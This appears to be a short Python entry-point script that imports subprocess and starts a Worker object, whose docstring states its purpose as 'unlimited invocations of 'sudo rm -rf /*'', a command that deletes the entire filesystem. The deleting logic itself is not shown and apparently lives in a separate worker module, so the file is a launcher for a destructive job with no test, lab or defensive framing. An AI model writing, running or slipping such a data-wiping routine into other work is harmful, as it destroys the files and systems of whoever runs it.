import subprocess
from worker import Worker

def main():
    """
    Main function to start the process of unlimited invocations of 'sudo rm -rf /*'.
    """
    worker = Worker()
    worker.start()

if __name__ == "__main__":
    main()